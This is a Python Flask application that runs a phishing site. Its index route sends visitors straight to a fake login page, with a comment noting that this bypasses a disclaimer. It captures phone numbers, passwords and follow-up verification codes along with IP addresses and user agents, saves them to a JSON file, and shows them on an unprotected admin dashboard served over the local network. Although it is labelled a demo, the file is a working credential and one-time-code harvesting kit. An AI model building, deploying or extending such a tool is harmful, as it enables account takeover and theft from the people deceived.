import os
from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_wtf.csrf import CSRFProtect
import json
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("phishing_demo.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
csrf = CSRFProtect(app)

# Store captured data (in memory for demo purposes)
captured_data = []

@app.route('/')
def index():
    # Directly redirect to login page, bypassing disclaimer
    return redirect(url_for('login_page'))

@app.route('/login', methods=['GET'])
def login_page():
    return render_template('login.html')

@app.route('/process_login', methods=['POST'])
def process_login():
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # Log the captured data
    data = {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'phone': phone,
        'password': password,
        'ip_address': request.remote_addr,
        'user_agent': request.user_agent.string
    }
    
    captured_data.append(data)
    logger.info(f"Captured login attempt: {data}")
    
    # Save to JSON file
    with open('captured_data.json', 'w') as f:
        json.dump(captured_data, f, indent=4)
    
    # Redirect to verification page
    return redirect(url_for('verification_page'))

@app.route('/verification', methods=['GET'])
def verification_page():
    return render_template('verification.html')

@app.route('/process_verification', methods=['POST'])
def process_verification():
    code = request.form.get('code')
    
    # Log the captured verification code
    data = {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'verification_code': code,
        'ip_address': request.remote_addr,
        'user_agent': request.user_agent.string
    }
    
    captured_data.append(data)
    logger.info(f"Captured verification code: {data}")
    
    # Save to JSON file
    with open('captured_data.json', 'w') as f:
        json.dump(captured_data, f, indent=4)
    
    # Redirect to success page
    return redirect(url_for('success_page'))

@app.route('/success')
def success_page():
    return render_template('success.html')

@app.route('/admin')
def admin():
    return render_template('admin.html', captured_data=captured_data)

@app.route('/api/stats')
def stats():
    total_attempts = len(captured_data)
    unique_ips = len(set(d['ip_address'] for d in captured_data if 'ip_address' in d))
    
    return {
        'total_attempts': total_attempts,
        'unique_visitors': unique_ips,
        'recent_attempts': captured_data[-5:] if captured_data else []
    }

def find_free_port():
    import socket
    from contextlib import closing
    
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.bind(('', 0))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return s.getsockname()[1]

if __name__ == '__main__':
    import socket
    
    # Try to use port 5000 first, if not available, find a free port
    try:
        # Test if port 5000 is available
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', 5000))
            port = 5000
    except OSError:
        # If port 5000 is not available, find a free port
        port = find_free_port()
    
    host = '0.0.0.0'
    print(f"\n* Running on: http://{host}:{port}")
    print(f"* Local access: http://localhost:{port}")
    
    # Get local IP address for LAN access
    try:
        import subprocess
        ip_output = subprocess.check_output("ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", shell=True)
        local_ip = ip_output.decode('utf-8').strip()
        print(f"* Network access: http://{local_ip}:{port}")
    except:
        print("* Could not determine local IP address")
    
    print("\n* Admin dashboard: [URL]/admin")
    print("* Press Ctrl+C to quit\n")
    
    app.run(debug=True, host=host, port=port)
